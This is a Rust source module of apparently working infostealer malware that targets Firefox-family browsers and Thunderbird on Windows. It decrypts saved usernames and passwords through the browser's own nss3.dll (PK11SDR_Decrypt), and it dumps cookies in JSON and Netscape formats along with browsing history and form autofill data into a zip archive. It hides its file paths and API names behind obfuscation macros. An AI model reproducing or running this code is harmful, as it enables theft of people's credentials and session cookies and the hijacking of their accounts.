//! Tier 1 (Gecko): Firefox-family profiles — logins.json + key4.db decrypted
//! via the browser's own nss3.dll (PK11SDR_Decrypt), cookies.sqlite,
//! places.sqlite → Passwords.json / Cookies.json / History.json / AutoFill.json.

use std::ffi::c_void;
use std::path::{Path, PathBuf};

use base64::Engine;
use rusqlite::types::Value;

use crate::fsutil::read_file;
use crate::info::Info;
use crate::resolve::{resolve, wide};
use crate::zipw::ZipBuilder;

struct GeckoBrowser {
    name: &'static str,
    /// Root directory relative to %APPDATA%.
    root_rel: String,
    /// Install dir candidates, relative to %ProgramFiles% / %ProgramFiles(x86)%.
    installs: Vec<String>,
}

/// Browser names are zip/Info.json output content; the filesystem paths are
/// obfuscated at rest and decoded per collect run.
fn browsers() -> Vec<GeckoBrowser> {
    vec![
        GeckoBrowser { name: "Firefox", root_rel: crate::obf!(r"Mozilla\Firefox"), installs: vec![crate::obf!(r"Mozilla Firefox")] },
        GeckoBrowser { name: "Waterfox", root_rel: crate::obf!(r"Waterfox"), installs: vec![crate::obf!(r"Waterfox")] },
        GeckoBrowser { name: "PaleMoon", root_rel: crate::obf!(r"Moonchild Productions\Pale Moon"), installs: vec![crate::obf!(r"Pale Moon")] },
        GeckoBrowser { name: "Basilisk", root_rel: crate::obf!(r"Basilisk"), installs: vec![crate::obf!(r"Basilisk")] },
        GeckoBrowser { name: "SeaMonkey", root_rel: crate::obf!(r"Mozilla\SeaMonkey"), installs: vec![crate::obf!(r"SeaMonkey")] },
        GeckoBrowser { name: "Cyberfox", root_rel: crate::obf!(r"Cyberfox"), installs: vec![crate::obf!(r"Cyberfox")] },
        GeckoBrowser { name: "IceDragon", root_rel: crate::obf!(r"Comodo\IceDragon"), installs: vec![crate::obf!(r"Comodo\IceDragon")] },
        GeckoBrowser { name: "BlackHawk", root_rel: crate::obf!(r"BlackHawk"), installs: vec![crate::obf!(r"BlackHawk"), crate::obf!(r"NETGATE Technologies\BlackHawk")] },
        GeckoBrowser { name: "SlimBrowser", root_rel: crate::obf!(r"SlimBrowser"), installs: vec![crate::obf!(r"SlimBrowser"), crate::obf!(r"FlashPeak\SlimBrowser")] },
        GeckoBrowser { name: "K-Meleon", root_rel: crate::obf!(r"K-Meleon"), installs: vec![crate::obf!(r"K-Meleon")] },
        GeckoBrowser { name: "BitTube", root_rel: crate::obf!(r"BitTube"), installs: vec![crate::obf!(r"BitTube")] },
        GeckoBrowser { name: "Thunderbird", root_rel: crate::obf!(r"Mozilla\Thunderbird"), installs: vec![crate::obf!(r"Mozilla Thunderbird")] },
    ]
}

// ---------------------------------------------------------------------------
// SQLite (WAL-aware; see sqlutil)
// ---------------------------------------------------------------------------

fn query_db(conn: &rusqlite::Connection, sql: &str) -> Vec<Vec<Value>> {
    let Ok(mut stmt) = conn.prepare(sql) else {
        return Vec::new();
    };
    let cols = stmt.column_count();
    let Ok(mut rows) = stmt.query([]) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    loop {
        match rows.next() {
            Ok(Some(row)) => {
                let mut r = Vec::with_capacity(cols);
                for i in 0..cols {
                    r.push(row.get::<_, Value>(i).unwrap_or(Value::Null));
                }
                out.push(r);
            }
            _ => break,
        }
    }
    out
}

fn val_str(v: &Value) -> String {
    match v {
        Value::Text(s) => s.clone(),
        Value::Integer(i) => i.to_string(),
        Value::Real(f) => f.to_string(),
        Value::Blob(b) => String::from_utf8_lossy(b).into_owned(),
        Value::Null => String::new(),
    }
}

fn val_i64(v: &Value) -> i64 {
    match v {
        Value::Integer(i) => *i,
        Value::Real(f) => *f as i64,
        Value::Text(s) => s.trim().parse().unwrap_or(0),
        _ => 0,
    }
}

// ---------------------------------------------------------------------------
// NSS (PK11SDR_Decrypt) via the browser's own nss3.dll
// ---------------------------------------------------------------------------

#[repr(C)]
struct SECItem {
    typ: u32,
    data: *mut u8,
    len: u32,
}

type FnSetDllDirectoryW = unsafe extern "system" fn(path: *const u16) -> i32;
type FnNssInit = unsafe extern "C" fn(configdir: *const i8) -> i32;
type FnPk11SdrDecrypt =
    unsafe extern "C" fn(data: *const SECItem, result: *mut SECItem, cx: *mut c_void) -> i32;
type FnNssShutdown = unsafe extern "C" fn() -> i32;

unsafe extern "C" fn nss_shutdown_noop() -> i32 {
    0
}

struct Nss {
    decrypt: FnPk11SdrDecrypt,
    shutdown: FnNssShutdown,
}

unsafe fn nss_begin(install: &Path, profile: &Path) -> Option<Nss> {
    let set_dir: FnSetDllDirectoryW =
        std::mem::transmute(resolve("kernel32.dll", crate::api!("SetDllDirectoryW")));
    if set_dir as usize == 0 {
        return None;
    }
    set_dir(wide(&install.to_string_lossy()).as_ptr());

    let init: FnNssInit = std::mem::transmute(resolve(&crate::obf!("nss3.dll"), crate::api!("NSS_Init")));
    let decrypt: FnPk11SdrDecrypt =
        std::mem::transmute(resolve(&crate::obf!("nss3.dll"), crate::api!("PK11SDR_Decrypt")));
    let shutdown: FnNssShutdown =
        std::mem::transmute(resolve(&crate::obf!("nss3.dll"), crate::api!("NSS_Shutdown")));
    if init as usize == 0 || decrypt as usize == 0 {
        set_dir(std::ptr::null());
        return None;
    }

    let mut cfg = Vec::new();
    cfg.extend_from_slice(crate::obf!("sql:").as_bytes());
    cfg.extend_from_slice(profile.to_string_lossy().as_bytes());
    cfg.push(0);
    if init(cfg.as_ptr().cast()) != 0 {
        set_dir(std::ptr::null());
        return None;
    }
    if shutdown as usize == 0 {
        // Can live without NSS_Shutdown; decrypt still works.
        return Some(Nss { decrypt, shutdown: nss_shutdown_noop });
    }
    Some(Nss { decrypt, shutdown })
}

unsafe fn nss_end(nss: Option<Nss>) {
    let set_dir: FnSetDllDirectoryW =
        std::mem::transmute(resolve("kernel32.dll", crate::api!("SetDllDirectoryW")));
    if let Some(n) = nss {
        (n.shutdown)();
    }
    if set_dir as usize != 0 {
        set_dir(std::ptr::null());
    }
}

unsafe fn nss_decrypt(nss: &Nss, b64: &str) -> Option<String> {
    let der = base64::engine::general_purpose::STANDARD
        .decode(b64.trim())
        .ok()?;
    if der.is_empty() {
        return None;
    }
    let input = SECItem {
        typ: 0,
        data: der.as_ptr() as *mut u8,
        len: der.len() as u32,
    };
    let mut out = SECItem {
        typ: 0,
        data: std::ptr::null_mut(),
        len: 0,
    };
    if (nss.decrypt)(&input, &mut out, std::ptr::null_mut()) != 0 {
        return None;
    }
    if out.data.is_null() || out.len == 0 {
        return None;
    }
    let bytes = std::slice::from_raw_parts(out.data, out.len as usize);
    Some(String::from_utf8_lossy(bytes).into_owned())
}

// ---------------------------------------------------------------------------
// Per-profile collection
// ---------------------------------------------------------------------------

/// Competition example zips prefix every JSON file with a UTF-8 BOM.
fn json_bom(value: &serde_json::Value) -> Vec<u8> {
    let mut v = vec![0xEF, 0xBB, 0xBF];
    v.extend_from_slice(&serde_json::to_vec_pretty(value).unwrap_or_default());
    v
}

fn collect_passwords(zip: &mut ZipBuilder, info: &mut Info, dir: &str, profile: &Path, install: Option<&Path>) -> bool {
    let Some(logins_bytes) = read_file(&profile.join(crate::obf!("logins.json"))) else {
        return false;
    };
    let Ok(json) = serde_json::from_slice::<serde_json::Value>(&logins_bytes) else {
        return false;
    };
    let Some(logins) = json.get(crate::obf!("logins")).and_then(|l| l.as_array()) else {
        return false;
    };
    if logins.is_empty() {
        return false;
    }

    let Some(install) = install else {
        // No browser install dir found — keep the raw artifacts so the
        // captured logins are not wholly absent from the zip.
        zip.add_file(&format!("{dir}/Passwords_raw_logins.json"), &logins_bytes);
        if let Some(k4) = read_file(&profile.join(crate::obf!("key4.db"))) {
            zip.add_file(&format!("{dir}/Passwords_raw_key4.db"), &k4);
        }
        return true;
    };

    let nss = unsafe { nss_begin(install, profile) };
    let Some(nss) = nss else {
        // nss3 unavailable/failed to init — same raw fallback (no count bump).
        zip.add_file(&format!("{dir}/Passwords_raw_logins.json"), &logins_bytes);
        if let Some(k4) = read_file(&profile.join(crate::obf!("key4.db"))) {
            zip.add_file(&format!("{dir}/Passwords_raw_key4.db"), &k4);
        }
        return true;
    };

    let mut out = Vec::new();
    for entry in logins {
        let host = entry.get(crate::obf!("hostname")).and_then(|v| v.as_str()).unwrap_or("");
        let enc_user = entry
            .get(crate::obf!("encryptedUsername"))
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let enc_pass = entry
            .get(crate::obf!("encryptedPassword"))
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let username = unsafe { nss_decrypt(&nss, enc_user) }.unwrap_or_default();
        let password = unsafe { nss_decrypt(&nss, enc_pass) }.unwrap_or_default();
        if host.is_empty() && username.is_empty() && password.is_empty() {
            continue;
        }
        out.push(serde_json::json!({
            "Hostname": host,
            "Username": username,
            "Password": password,
        }));
    }
    unsafe { nss_end(Some(nss)) };

    if out.is_empty() {
        return false;
    }
    info.passwords_count += out.len();
    zip.add_file(&format!("{dir}/Passwords.json"), &json_bom(&serde_json::Value::Array(out)));
    true
}

fn collect_cookies(zip: &mut ZipBuilder, info: &mut Info, dir: &str, profile: &Path) -> bool {
    let Some(db) = crate::sqlutil::open(&profile.join(crate::obf!("cookies.sqlite"))) else {
        return false;
    };
    let rows = query_db(
        &db,
        crate::obf!("SELECT name, value, host, path, expiry, isSecure, isHttpOnly FROM moz_cookies").as_str(),
    );
    if rows.is_empty() {
        return false;
    }

    let mut json_rows = Vec::with_capacity(rows.len());
    let mut txt = String::from("# Netscape HTTP Cookie File\n");
    for r in &rows {
        if r.len() < 7 {
            continue;
        }
        let name = val_str(&r[0]);
        let value = val_str(&r[1]);
        let host = val_str(&r[2]);
        let path = val_str(&r[3]);
        let expiry = val_i64(&r[4]);
        let secure = val_i64(&r[5]) != 0;
        let http_only = val_i64(&r[6]) != 0;
        json_rows.push(serde_json::json!({
            "domain": host,
            "name": name,
            "value": value,
            "path": path,
            "secure": secure,
            "session": expiry == 0,
            "expirationDate": expiry,
            "httpOnly": http_only,
            "hostOnly": !host.starts_with('.'),
            "storeId": serde_json::Value::Null,
        }));
        let flag = if host.starts_with('.') { "TRUE" } else { "FALSE" };
        let sec = if secure { "TRUE" } else { "FALSE" };
        txt.push_str(&format!(
            "{host}\t{flag}\t{path}\t{sec}\t{expiry}\t{name}\t{value}\n"
        ));
    }
    if json_rows.is_empty() {
        return false;
    }
    info.cookies_count += json_rows.len();
    zip.add_file(
        &format!("{dir}/Cookies.json"),
        &json_bom(&serde_json::Value::Array(json_rows)),
    );
    zip.add_file(&format!("{dir}/Cookies.txt"), txt.as_bytes());
    true
}

fn collect_history(zip: &mut ZipBuilder, info: &mut Info, dir: &str, profile: &Path) -> bool {
    let Some(db) = crate::sqlutil::open(&profile.join(crate::obf!("places.sqlite"))) else {
        return false;
    };
    let rows = query_db(
        &db,
        crate::obf!("SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE visit_count > 0").as_str(),
    );
    if rows.is_empty() {
        return false;
    }
    let mut out = Vec::with_capacity(rows.len());
    for r in &rows {
        if r.len() < 4 {
            continue;
        }
        out.push(serde_json::json!({
            "Url": val_str(&r[0]),
            "Title": val_str(&r[1]),
            "VisitCount": val_i64(&r[2]),
            // moz_places.last_visit_date is µs since unix epoch.
            "Timestamp": val_i64(&r[3]) / 1_000_000,
        }));
    }
    if out.is_empty() {
        return false;
    }
    info.history_count += out.len();
    zip.add_file(&format!("{dir}/History.json"), &json_bom(&serde_json::Value::Array(out)));
    true
}

fn collect_autofill(zip: &mut ZipBuilder, info: &mut Info, dir: &str, profile: &Path) -> bool {
    let Some(db) = crate::sqlutil::open(&profile.join(crate::obf!("formhistory.sqlite"))) else {
        return false;
    };
    let rows = query_db(&db, crate::obf!("SELECT fieldname, value FROM moz_formhistory").as_str());
    if rows.is_empty() {
        return false;
    }
    let mut out = Vec::with_capacity(rows.len());
    for r in &rows {
        if r.len() < 2 {
            continue;
        }
        out.push(serde_json::json!({
            "Name": val_str(&r[0]),
            "Value": val_str(&r[1]),
        }));
    }
    if out.is_empty() {
        return false;
    }
    info.autofill_count += out.len();
    zip.add_file(&format!("{dir}/AutoFill.json"), &json_bom(&serde_json::Value::Array(out)));
    true
}

fn find_install(b: &GeckoBrowser) -> Option<PathBuf> {
    let mut roots = Vec::new();
    if let Ok(pf) = std::env::var("ProgramFiles") {
        roots.push(PathBuf::from(pf));
    }
    if let Ok(pf86) = std::env::var("ProgramFiles(x86)") {
        roots.push(PathBuf::from(pf86));
    }
    for root in roots {
        for cand in &b.installs {
            let p = root.join(cand);
            if p.is_dir() {
                return Some(p);
            }
        }
    }
    None
}

pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
    let Ok(appdata) = std::env::var("APPDATA") else {
        return;
    };
    let appdata = PathBuf::from(appdata);

    for b in &browsers() {
        let profiles_root = appdata.join(&b.root_rel).join(crate::obf!("Profiles"));
        let Ok(entries) = std::fs::read_dir(&profiles_root) else {
            continue;
        };
        let mut found_any = false;
        for entry in entries.flatten() {
            let profile = entry.path();
            if !profile.is_dir() {
                continue;
            }
            let Some(profile_name) = profile.file_name().map(|n| n.to_string_lossy().into_owned())
            else {
                continue;
            };
            let dir = format!("Browser_{}_{}", b.name, profile_name);
            let install = find_install(b);

            let mut got = false;
            got |= collect_passwords(zip, info, &dir, &profile, install.as_deref());
            got |= collect_cookies(zip, info, &dir, &profile);
            got |= collect_history(zip, info, &dir, &profile);
            got |= collect_autofill(zip, info, &dir, &profile);
            found_any |= got;
        }
        if found_any {
            info.add_browser(b.name);
        }
    }
}
